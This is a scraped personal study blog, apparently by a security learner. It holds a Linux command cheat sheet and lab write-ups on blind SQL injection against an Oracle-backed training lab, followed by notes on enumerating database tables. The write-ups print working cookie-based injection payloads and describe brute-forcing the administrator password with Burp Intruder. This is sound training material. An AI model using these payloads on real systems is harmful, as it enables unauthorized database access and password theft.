<td>ssh username@ip   登录远程主机</td>
</tr>
<tr>
<td>vi</td>
<td>修改文件 vi filename：打开/新建文件，光标置于第一行首；i 插入文本，修改结束后ESC；:wq保存并退出</td>
</tr>
<tr>
<td>rpm</td>
<td>软件包管理工具，类似windows里面的”添加/删除程序”；rpm -qa  查询所有；rpm -e 文件名 删除指定内容；</td>
</tr>
<tr>
<td>ps</td>
<td>显示当前进程状态；-A列出所有的进程；ps -ef|grep 进程关键字查找指定进程，例ps -ef|grep php（显示php的进程）</td>
</tr>
<tr>
<td>sudo</td>
<td>普通用户用sudo命令即是以root管理员身份执行指令；wheel group中的user才能用sudo指令；将用户加入wheel group的方法是：gpasswd -a username wheel</td>
</tr>
<tr>
<td>sh</td>
<td>-c string读取并执行字符串的内容；直接跟filename 从文件中读命令并执行命令</td>
</tr>
<tr>
<td>id</td>
<td>显示用户的id</td>
</tr>
</tbody></table>
<h4 id="Nano-terminal-text-editor"><a href="#Nano-terminal-text-editor" class="headerlink" title="Nano:terminal text editor"></a>Nano:terminal text editor</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano filename</span><br></pre></td></tr></table></figure>

<h4 id="wget-download-files"><a href="#wget-download-files" class="headerlink" title="wget:download files"></a>wget:download files</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget website</span><br></pre></td></tr></table></figure>

<h4 id="SCP-transfer-files-between-two-computers"><a href="#SCP-transfer-files-between-two-computers" class="headerlink" title="SCP:transfer files between two computers"></a>SCP:transfer files between two computers</h4><p>SCP:Secure copy 使用SSH协议的认证和加密在主机之间传输文件</p>
<p>*本地主机发送文件到远程主机</p>
<table>
<thead>
<tr>
<th>Variable</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>远程主机IP地址</td>
<td>192.168.1.30</td>
</tr>
<tr>
<td>远程主机用户名</td>
<td>ubuntu</td>
</tr>
<tr>
<td>本地主机文件名</td>
<td>important.txt</td>
</tr>
<tr>
<td>发送到远程主机存储的文件名</td>
<td></td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt</span><br></pre></td></tr></table></figure>

<p>*远程主机发送文件到本地主机</p>
<table>
<thead>
<tr>
<th>Variable</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>远程主机IP地址</td>
<td>192.168.1.30</td>
</tr>
<tr>
<td>远程主机用户名</td>
<td>ubuntu</td>
</tr>
<tr>
<td>远程主机文件名</td>
<td>documents.txt</td>
</tr>
<tr>
<td>发送到本地主机存储的文件名</td>
<td>notes.txt</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt </span><br></pre></td></tr></table></figure>

<h4 id="http-server：使本地计算机变成一个快速简便的网络服务器"><a href="#http-server：使本地计算机变成一个快速简便的网络服务器" class="headerlink" title="http.server：使本地计算机变成一个快速简便的网络服务器"></a>http.server：使本地计算机变成一个快速简便的网络服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>

<p>这样就可以使用<code>wget 计算机的ip地址+文件名</code>来下载文件</p>
<h4 id="常见文件夹"><a href="#常见文件夹" class="headerlink" title="常见文件夹"></a>常见文件夹</h4><h5 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h5><p>存放操作系统的系统文件的常见位置</p>
<h5 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h5><p>存储系统上运行的服务或应用程序经常访问或写入的数据。</p>
<p>例如log文件</p>
<h5 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h5><p>root用户的主目录</p>
<h5 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h5><p> store data that is only needed to be accessed once or twice</p>
<p>电脑一旦被重启，该文件的内容也会被清除</p>
<p>所有用户都可以写该文件，可用来存储脚本</p>
<h4 id="cat-etc-passwd的输出内容"><a href="#cat-etc-passwd的输出内容" class="headerlink" title="cat /etc/passwd的输出内容"></a>cat /etc/passwd的输出内容</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">从左到右,以:作为分隔符,内容依次为</span><br><span class="line">·username</span><br><span class="line">·Encrypted password (x represents password is stored)</span><br><span class="line">·User ID number (UID)</span><br><span class="line">·User’s group ID number (GID)</span><br><span class="line">·Full name</span><br><span class="line">·User’s home directory</span><br><span class="line">·User’s Login shell (default is bash shell)</span><br></pre></td></tr></table></figure>

<h4 id="linux中’-’的作用："><a href="#linux中’-’的作用：" class="headerlink" title="linux中’|’的作用："></a>linux中’|’的作用：</h4><p>将左右两个命令隔开，左边命令的输出会作为右边命令的输入</p>
<h4 id="linux中’-gt-’和‘-gt-gt-’的作用："><a href="#linux中’-gt-’和‘-gt-gt-’的作用：" class="headerlink" title="linux中’&gt;’和‘&gt;&gt;’的作用："></a>linux中’&gt;’和‘&gt;&gt;’的作用：</h4><p><code>&gt;</code>命令会将原有文件内容覆盖，如果是存入不存在的文件名，那么就会新建文件再存入</p>
<p><code>&gt;&gt;</code>符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容</p>
<h3 id="PSCP"><a href="#PSCP" class="headerlink" title="PSCP"></a>PSCP</h3><p> a tool for transferring files securely between computers using an SSH connection.</p>
<p>①接收服务器发送到本机的文件</p>
<p>格式：<code>pscp [options] [user@]host:source target</code></p>
<p>例：</p>
<p>copy the file <code>/etc/hosts</code> from the server <code>example.com</code> as user <code>fred</code> to the file <code>c:\temp\example-hosts.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pscp fred@example.com:/etc/hosts c:\temp\example-hosts.txt</span><br></pre></td></tr></table></figure>



<p>②发送本地文件到远程服务器</p>
<p>格式：<code>pscp [options] source [source...] [user@]host:target</code></p>
<p>copy the local file <code>c:\documents\foo.txt</code> to the server <code>example.com</code> as user <code>fred</code> to the file <code>/tmp/foo</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pscp c:\documents\foo.txt fred@example.com:/tmp/foo</span><br></pre></td></tr></table></figure>



<p>③一次发送一个文件夹下的所有文件  用*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pscp c:\documents\*.doc fred@example.com:docfiles</span><br><span class="line">pscp fred@example.com:source/*.c c:\source</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/08/13/SQL%20injection-Blind%20with%20conditional%20errors/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-08-13 10:02:07" itemprop="dateCreated datePublished" datetime="2021-08-13T10:02:07+08:00">2021-08-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-09-11 08:33:17" itemprop="dateModified" datetime="2021-09-11T08:33:17+08:00">2021-09-11</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h1><h4 id="已知信息："><a href="#已知信息：" class="headerlink" title="已知信息："></a>已知信息：</h4><ul>
<li>存在SQL盲注漏洞</li>
<li>使用cookie，并执行包含提交cookie值的SQL查询</li>
<li>数据库包含名为users的表，该表包含列username和password</li>
</ul>
<h4 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h4><p>获得username=‘administrator’的password并登录</p>
<h4 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h4><ol>
<li><p>在截获的HTTP报文找到</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=5EPF5vm2ZLKfZtK6;</span><br></pre></td></tr></table></figure></li>
<li><p>添加<code>&#39;</code>，response报错 ：500</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>TrackingId=5EPF5vm2ZLKfZtK6&#x27;;</span><br></pre></td></tr></table></figure>

<p>【从上可知，可以接收到error message】</p>
</li>
<li><p>查看提交cookie值进行SQL查询返回多少列</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=5EPF5vm2ZLKfZtK6&#x27; order by 1--;</span><br><span class="line">》》200</span><br><span class="line">TrackingId=5EPF5vm2ZLKfZtK6&#x27; order by 2--;</span><br><span class="line">》》500</span><br><span class="line">》》》可知，只返回1列</span><br></pre></td></tr></table></figure></li>
<li><p>查看使用的数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select null--;</span></span><br><span class="line"><span class="string">》》500</span></span><br><span class="line"><span class="string">TrackingId=5EPF5vm2ZLKfZtK6&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">from</span> dual<span class="comment">--;</span></span><br><span class="line">》》<span class="number">200</span></span><br><span class="line">》》》可知，使用的是Oracle数据库</span><br></pre></td></tr></table></figure></li>
<li><p>查看是否存在名为users的表</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select null from users--;</span></span><br><span class="line"><span class="string">》》200</span></span><br><span class="line"><span class="string">TrackingId=5EPF5vm2ZLKfZtK6&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">from</span> name<span class="operator">-</span><span class="keyword">of</span><span class="operator">-</span><span class="keyword">no</span><span class="operator">-</span><span class="keyword">table</span><span class="comment">--;</span></span><br><span class="line">》》<span class="number">500</span></span><br><span class="line">》》》可确定含有users表</span><br></pre></td></tr></table></figure></li>
<li><p>查看是否存在username = ‘administrator’的用户</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select case when (username=&#x27;</span>administrator<span class="string">&#x27;) then to_char(1/0) else null end from users--;</span></span><br><span class="line"><span class="string">》》500</span></span><br><span class="line"><span class="string">TrackingId=5EPF5vm2ZLKfZtK6&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (username<span class="operator">=</span><span class="string">&#x27;?????&#x27;</span>) <span class="keyword">then</span> to_char(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">else</span> <span class="keyword">null</span> <span class="keyword">end</span> <span class="keyword">from</span> users<span class="comment">--;</span></span><br><span class="line">》》<span class="number">200</span></span><br><span class="line">》》》可确定既有username这列，也有username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>的用户</span><br></pre></td></tr></table></figure>

<p>and select ‘a’ from users where username = ‘administrator’ = ’b？@！#！’都是返回200，因为这只是没有查找对应的内容，返回null罢了，但不会导致数据库报错。用to_char(1/0)目的是让数据库报错</p>
<p><code>TrackingId=5EPF5vm2ZLKfZtK6&#39; union select case when (username=&#39;administrator&#39;) then to_char(1/0) else null end from users--;</code></p>
</li>
<li><p>确定密码的长度（Intruder）</p>
<p>将password&gt;1中的1作为变量</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select case when (username=&#x27;</span>administrator<span class="string">&#x27; and length(password)&gt;1) then to_char(1/0) else null end from users--;</span></span><br></pre></td></tr></table></figure>

<p>最终可确定，长度为20</p>
<p>这里有一个问题！就是为什么把to_char(1/0)和null换位置就不work了？</p>
</li>
<li><p>确定密码 attack type为cluster bomb</p>
<p>§ ‘…’§中的内容为变量，下边确定了两个变量</p>
<p>第一个变量的payload option有1-20</p>
<p>第二个变量的payload option有a-z0-9</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>EPF5vm2ZLKfZtK6<span class="string">&#x27; union select case when (username=&#x27;</span>administrator<span class="string">&#x27; and substr(password,§1§,1)!=&#x27;</span>§a§<span class="string">&#x27;) then to_char(1/0) else null end from users--;</span></span><br></pre></td></tr></table></figure>

<p>即可获得密码</p>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/08/12/SQL%20injection-Blind%20with%20conditional%20responses/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-08-12 09:16:58 / Modified: 11:07:17" itemprop="dateCreated datePublished" datetime="2021-08-12T09:16:58+08:00">2021-08-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a>Blind SQL injection with conditional responses</h2><h4 id="什么是SQL盲注"><a href="#什么是SQL盲注" class="headerlink" title="什么是SQL盲注"></a>什么是SQL盲注</h4><p>我的理解：</p>
<p>普通存在SQL注入漏洞的web application，进行的SQL操作返回的结果都能返回到页面上。</p>
<p>如我用  SELECT version FROM v$instance  ，就可以显示version在页面上</p>
<img src="D:\blog\H01iday\source\_posts\pics\version.png" style="zoom:60%;" />

<p>但是！</p>
<p>*<em>Blind SQL injection arises when an application is vulnerable to SQL injection, but <em>==its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors==</em>.</em>*</p>
<p>所以SQL盲注就是，你对数据库进行任何操作的结果，都不会包含在HTTP响应报文里</p>
<p>则你无法通过像UNION attack那样的方法，将想要的信息通过SQL语句，写到HTTP报文中，并显示在页面。</p>
<p>既然无法通过HTTP响应报文得到想要的信息，那应该怎么办呢？</p>
<h4 id="triggering-conditional-responses（lab1）"><a href="#triggering-conditional-responses（lab1）" class="headerlink" title="triggering conditional responses（lab1）"></a>triggering conditional responses（lab1）</h4><h5 id="题目说明："><a href="#题目说明：" class="headerlink" title="题目说明："></a>题目说明：</h5><p>该网页通过cookies来跟踪用户使用信息。</p>
<p>当用户发送向该网页的请求包含：<code>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4‘</code></p>
<p>服务器会执行</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId <span class="operator">=</span> <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure>

<p>执行结果不会写入HTTP响应报文中。</p>
<p>但是如果成功执行了，即如果检测到对应cookie的信息，则会显示<code>Welcome back</code>的信息；反之，则不会；</p>
<h5 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h5><p> log in as the <code>administrator</code> user</p>
<h5 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h5><ol>
<li><p>进入网页，proxy截取http请求报文，发送至Repeater，并找到TrackingId</p>
</li>
<li><p>添加<code>&#39;AND+&#39;1&#39;=&#39;1</code>，send，查看response是否存在’Welcome back‘字样</p>
<p>发现存在；【下面每一步都是通过看response是否存在welcome back来进行判断】</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND+&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>![welcome back](D:\blog\H01iday\source_posts\pics\welcome back.png)</p>
</li>
<li><p>添加<code>&#39;AND+&#39;1&#39;=&#39;2</code>，send，查看response是否存在’Welcome back‘字样</p>
<p>发现不存在</p>
<p>【通过2-3两步试验我们可以知道，我们可以通过这个地方测试一个boolean条件的正确性】</p>
</li>
<li><p>可以验证存在表名为users的表。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND (select &#x27;</span>a<span class="string">&#x27; from users limit 1) = &#x27;</span>a;</span><br></pre></td></tr></table></figure>

<p>注意：1.limit 1代表只选取前一行。即便有多行符合条件，只选取前一行。这样做的原因是，如果存在多行都有’a‘,那么它返回结果也是若干行的’a’,则无法=’a’;</p>
<p>​            2.不一定要选取a，但选取的内容一定要是users表中存在的，一个不行可以多试验几个（其实就是猜）</p>
</li>
<li><p>验证存在administrator这个用户名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND (select &#x27;</span>a<span class="string">&#x27; from users where username = &#x27;</span>administrator<span class="string">&#x27;) = &#x27;</span>a;</span><br></pre></td></tr></table></figure></li>
<li><p>验证存在password列，且administrator用户密码长度超过1</p>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>jIDN428bTv8zNNGA<span class="string">&#x27;+AND (select &#x27;</span>a<span class="string">&#x27; from users where username = &#x27;</span>administrator<span class="string">&#x27; AND length(password)&gt;1) = &#x27;</span>a;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li><p>发送到Intruder。1作为变量；payload type改为Numbers；payload Options From1 To 40 Step:1；Grep-Match先Clear原有内容，再添加“Welcome back”；start attack；</p>
<p>结果发现密码长度为20</p>
</li>
<li><p>回到Intruder positions页面；attack type：Cluster bomb；变量1payload options： 1-20；变量2payload options：a-z0-9；start attack；即可获得20位的password</p>
<p><img src="D:\blog\H01iday\source_posts\pics\爆破密码.png" alt="爆破密码"></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">简单理解：其实SQL盲注就是，你通过SQL语句问server，它不会给你答案。</span><br><span class="line">		但是你可以通过特定信息知道server是否正确执行了某些SQL语句。</span><br><span class="line">		例如，我这里只要看到&#x27;welcome back&#x27;我就知道server正确执行了那条语句。</span><br><span class="line">		所以就是，你可以猜，然后server会告诉你对不对。</span><br><span class="line">		如果你猜对了，就&#x27;welcome back&#x27;,否则，不会返回。</span><br><span class="line">		其它SQL注入是问答题。SQL盲注是是非题。</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/08/11/SQL%20injection-Examining%20the%20database/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/08/11/SQL%20injection-Examining%20the%20database/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-08-11 10:59:21" itemprop="dateCreated datePublished" datetime="2021-08-11T10:59:21+08:00">2021-08-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-09-11 15:35:22" itemprop="dateModified" datetime="2021-09-11T15:35:22+08:00">2021-09-11</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Examining-the-database"><a href="#Examining-the-database" class="headerlink" title="Examining the database"></a>Examining the database</h2><h4 id="获取数据库的type-amp-version"><a href="#获取数据库的type-amp-version" class="headerlink" title="获取数据库的type&amp;version"></a>获取数据库的type&amp;version</h4><table>
<thead>
<tr>
<th align="left">database</th>
<th>syntax</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td>`SELECT banner FROM v$version(含有详细信息) \ SELECT version FROM v$instance（只有一个版本号）</td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td align="left">SQLite</td>
<td><code>sqlite_version()</code></td>
</tr>
</tbody></table>
<h4 id="获取数据库表及列的信息（适用除Oracle、SQLite的数据库）"><a href="#获取数据库表及列的信息（适用除Oracle、SQLite的数据库）" class="headerlink" title="获取数据库表及列的信息（适用除Oracle、SQLite的数据库）"></a>获取数据库表及列的信息（适用除Oracle、SQLite的数据库）</h4><h5 id="获取表的信息"><a href="#获取表的信息" class="headerlink" title="获取表的信息"></a>获取表的信息</h5><p>information_schema.tables中含数据库中所有表的信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br></pre></td></tr></table></figure>

<p>This returns output like the following:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">MyDatabase 		dbo 	Products 	BASE <span class="keyword">TABLE</span></span><br><span class="line">MyDatabase 		dbo 	Users 		BASE <span class="keyword">TABLE</span></span><br><span class="line">MyDatabase 		dbo 	Feedback 	BASE <span class="keyword">TABLE</span></span><br></pre></td></tr></table></figure>

<p>如果想要只想获得TABLE_NAME可以</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.tables</span><br></pre></td></tr></table></figure>

<h5 id="获取列的信息"><a href="#获取列的信息" class="headerlink" title="获取列的信息"></a>获取列的信息</h5><p>information_schema.columns中含数据库中所有列的信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;Users&#x27;</span></span><br><span class="line">#获得Users表中所有列的信息</span><br></pre></td></tr></table></figure>

<p>This returns output like the following:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_CATALOG TABLE_SCHEMA TABLE_NAME 	COLUMN_NAME DATA_TYPE</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">MyDatabase 		dbo 		Users 		UserId 		<span class="type">int</span></span><br><span class="line">MyDatabase 		dbo 		Users 		Username 	<span class="type">varchar</span></span><br><span class="line">MyDatabase 		dbo 		Users 		Password 	<span class="type">varchar</span></span><br></pre></td></tr></table></figure>
